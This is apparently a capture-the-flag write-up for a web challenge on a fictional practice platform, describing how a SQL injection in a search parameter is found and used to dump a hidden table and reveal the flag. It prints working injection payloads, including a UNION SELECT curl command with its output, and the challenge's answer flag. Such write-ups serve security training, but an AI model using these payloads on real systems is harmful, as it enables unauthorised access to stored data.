# The Hidden Test Case

**Event:** CryoVault CTF 2026
**Category:** web
**Flag:** `isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}`

---

"LeetVault", a fictional interview-practice platform. `/challenge` names the vulnerability class outright (SQL Injection), with a nudge toward hidden rows reachable only through the data layer. `GET /api/problems?search=<query>` searches 6 public problems.

**Finding the injection:** a lone `'` returns HTTP 400 ("legacy search service rejected"), but a *balanced* `' OR '1'='1` returns all 6 rows - the 400 is just a Flask handler catching a raw sqlite3 syntax error, not a WAF. The query is `SELECT id, title, category, difficulty FROM problems WHERE title LIKE '%<search>%'`.

**Exploitation:** `' order by 4-- ` succeeds, `' order by 5-- ` fails → 4 columns. Dumping `sqlite_master` reveals three tables, including an `internal_notes(id, note_type, content, created_at)` table that the app never exposes directly.

```bash
curl -s --get 'https://isfcrpesu-hidden-test-case.chals.io/api/problems' \
  --data-urlencode "search=' UNION SELECT id,note_type,content,created_at FROM internal_notes-- "
id=1 note_type='legacy_migration' content='Migration verification complete.
        Hidden test case: isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}'
isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}
```

Takeaways: a 400 on a single quote is a symptom of injectable concatenation, not proof of a WAF - compare unbalanced vs. balanced quote payloads. `-- ` (dash-dash-space) is required to comment out the app's trailing `%'`. The "hidden record" was a leaked operational note table, not an `is_public=0` problem row - enumerate `sqlite_master` and dump every table rather than guessing.
